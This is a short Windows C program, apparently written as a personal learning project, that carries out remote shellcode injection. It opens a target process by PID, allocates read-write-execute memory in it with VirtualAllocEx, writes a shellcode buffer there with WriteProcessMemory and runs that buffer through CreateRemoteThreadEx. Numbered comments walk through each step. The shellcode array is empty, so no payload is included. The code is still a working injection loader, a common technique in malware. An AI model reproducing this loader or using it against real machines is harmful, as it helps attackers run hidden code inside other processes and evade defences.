//
// Created by chazzybearr on 6/4/2023.
//

// Steps for shellcode injection:
// 1. Get a handle to, or create, a process
// 2. Allocate memory to that process
// 3. Write the shellcode to the process memory
// 4. Create a thread which runs the shellcode in the process

#include <windows.h>
#include <stdio.h>

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

unsigned char text[] = "";

int main(int argc, char *argv[]) {

    if (argc < 2) {
        fprintf(stderr, "usage: injection.exe <PID>\n");
        return EXIT_FAILURE;
    }

    PID = strtol(argv[1], NULL, 10);
    printf("getting a handle to the process with PID: %ld\n", PID);
    fflush(stdout);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) {
        fprintf(stderr, "failed to get a handle to the process with PID: %ld, error: %ld\n", PID, GetLastError());
        return EXIT_FAILURE;
    }
    // Handle is valid
    printf("got a handle to the process: 0x%p\n", hProcess);

    // Allocate memory for shellcode
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(text), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("allocated %llu bytes to the process\n", sizeof(text));

    WriteProcessMemory(hProcess, rBuffer, text, sizeof(text), NULL);
    printf("written %llu bytes to the process\n", sizeof(text));

    // Create thread to run shellcode
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) rBuffer, NULL, 0, 0, &TID);
    if (hThread == NULL) {
        fprintf(stderr, "failed to get a handle to the thread, error: %ld", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    printf("got a handle to the thread %ld: %p\n", TID, hThread);
    printf("waiting for thread to finish...\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("thread finished executing\n");

    printf("closing handles...\n");
    CloseHandle(hProcess);
    CloseHandle(hThread);
    printf("done\n");


	return EXIT_SUCCESS;
}
